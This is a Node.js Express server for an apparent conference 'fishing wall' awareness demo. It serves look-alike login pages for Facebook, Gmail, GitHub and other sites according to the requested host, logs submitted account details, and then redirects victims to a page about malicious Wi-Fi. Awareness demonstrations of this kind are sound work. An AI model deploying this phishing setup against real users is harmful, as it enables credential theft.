const express = require('express');
const path = require('path');
const app = express();
const port = 5001

app.use(express.static(path.join(__dirname, '../frontend')));

// Receive the account information from fishing sites.
app.post('/fish', function(request, response){
    // TODO: Get account information and store into the coressponding json file according to gmail account.
    const host = request.headers.host
    console.log(host)
    console.log(request.url);
    console.log(request.body);
    
    // Redirect to introduction page.
    response.redirect('introduction')
});

// Introduce hitcon fishing wall.
app.get('/introduction', function(request, response){
    // TODO: 科普惡意 wifi 的危害以及辨認方法
    // TODO: 告知綿羊這個 wifi 不會偷其他的東西，並且綿羊牆是匿名的，請綿羊放心
    // TODO: 請他去連官方提供的 wifi
    // TODO: 告知他釣魚牆的相關資訊，e.g. 位置、釣魚牆統計資料
    response.sendFile('frontend/introduction/index.html', {root: '../'});
});

// Receive flags.
app.get('/flag', function(request, response){
    // TODO (optional): Get flag from frontend and store into the corresponding json file.
});

// Display all fishing sites.
app.all('*', function(request, response){
    // TODO: Redirect to fishing sites based on the request url.
    const host = request.headers.host
    console.log(host)
    console.log(request.url);
    
    if (host.includes('facebook')){
        response.sendFile('frontend/facebook/index.html', {root: '../'});
    }
    else if (host.includes('gmail')){
        response.sendFile('frontend/gmail/index.html', {root: '../'});
    }
    else if (host.includes('twitter')){
        response.sendFile('frontend/twitter/index.html', {root: '../'});
    }
    else if (host.includes('github')){
        response.sendFile('frontend/github/index.html', {root: '../'});
    }
    else if (host.includes('linkedin')){
        response.sendFile('frontend/linkedin/index.html', {root: '../'});
    }
    else if (host.includes('instagram')){
        response.sendFile('frontend/instagram/index.html', {root: '../'});
    }
    else if (host.includes('hackmd')){
        response.sendFile('frontend/hackmd/index.html', {root: '../'});
    }
    else{
        response.sendFile('frontend/hitcon/index.html', {root: '../'});
    }
});

app.listen(port, () => {
    console.log(`listening on port ${port}`)
})